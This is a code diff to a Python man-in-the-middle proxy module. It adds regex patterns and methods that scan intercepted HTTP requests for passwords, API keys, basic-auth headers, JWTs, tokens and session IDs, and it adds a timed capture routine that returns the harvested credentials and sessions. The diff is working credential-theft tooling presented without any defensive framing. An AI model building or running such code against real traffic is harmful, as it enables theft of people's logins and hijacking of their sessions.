@@ -1,10 +1,19 @@
-import json, os, ssl, sys, tempfile, threading, time, uuid
+import json, os, ssl, sys, tempfile, threading, time, uuid, re
 from datetime import datetime
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from typing import Optional, Dict, List
 from tools.log_utils import get_logger
 
 logger = get_logger("mitm_proxy")
+
+CREDENTIAL_PATTERNS = [
+    (r'(?i)(password|passwd|pwd)=([^&\s"]+)', "password"),
+    (r'(?i)(secret|api_key|apikey)=([^&\s"]+)', "api_key"),
+    (r'(?i)authorization:\s*basic\s+([^\s\r\n]+)', "basic_auth"),
+    (r'(?i)bearer\s+([a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+)', "jwt"),
+    (r'(?i)(token|jwt)=([^&\s"]+)', "token"),
+    (r'(?i)session[_-]?id=([^&\s"]+)', "session"),
+]
 
 CAPTURED = []
 CAPTURE_LOCK = threading.Lock()
@@ -363,6 +372,48 @@ class MITMProxy:
 
     def running(self) -> bool:
         return self._thread is not None and self._thread.is_alive()
+
+    def extract_credentials(self, captured: List[Dict] = None) -> List[Dict]:
+        if captured is None:
+            captured = self.get_captured()
+        findings = []
+        for entry in captured:
+            raw = entry.get("req_body", "") + "\n"
+            raw += "\n".join(f"{k}: {v}" for k, v in entry.get("req_headers", {}).items())
+            for pattern, label in CREDENTIAL_PATTERNS:
+                for m in re.finditer(pattern, raw):
+                    findings.append({
+                        "type": label,
+                        "match": m.group(0)[:80],
+                        "value": m.group(2) if m.lastindex >= 2 else m.group(1),
+                        "url": entry.get("url", ""),
+                    })
+        return findings
+
+    def extract_sessions(self, captured: List[Dict] = None) -> List[Dict]:
+        if captured is None:
+            captured = self.get_captured()
+        sessions = []
+        for entry in captured:
+            raw = entry.get("req_body", "")
+            for m in re.finditer(r'(?i)(session[_-]?id|token|jwt)=([^&\s"]+)', raw):
+                sessions.append({
+                    "param": m.group(1),
+                    "value": m.group(2),
+                    "url": entry.get("url", ""),
+                })
+        return sessions
+
+    def capture_with_duration(self, duration: int = 60) -> Dict:
+        self.start()
+        time.sleep(duration)
+        self.stop()
+        cap = self.get_captured()
+        return {
+            "total_requests": len(cap),
+            "credentials": self.extract_credentials(cap),
+            "sessions": self.extract_sessions(cap),
+        }
 
 
 _GLOBAL_PROXY: Optional[MITMProxy] = None
